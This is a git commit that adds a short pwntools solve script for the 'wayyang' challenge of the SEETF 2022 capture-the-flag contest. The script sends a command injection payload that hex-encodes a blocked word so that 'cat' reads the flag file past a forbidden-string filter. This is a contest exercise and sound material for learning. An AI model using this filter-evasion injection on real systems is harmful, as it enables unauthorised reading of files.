959c15e9cbd0fa20a94a847d9e865479c192d6e0
GonTanaka <96073448+GonTanaka@users.noreply.github.com>
2022-06-05 17:18:24 +0100

    Add files via upload

--- SEETF2022/pwn/wayyang/solve.py
+++ SEETF2022/pwn/wayyang/solve.py
@@ -1,1 +1,26 @@
+#!/usr/bin/env python3
+#3-06-2022
+#Gon
+#Bypass forbidden string
 
+from pwn import *
+
+context.log_level='debug'
+
+
+def conn():
+    if args.REMOTE:
+        io = remote('fun.chall.seetf.sg', 50008)
+    else:
+        io = process('./wayyang.py')
+        if args.DEBUG:
+            gdb.attach(io)
+
+    return io
+
+io = conn()
+io.sendlineafter(b'>> ', b'4')
+io.sendlineafter(b'babe', b'\'cat `echo -e "\\x46\\x4c\\x41\\x47"`\'')
+
+
+io.interactive()
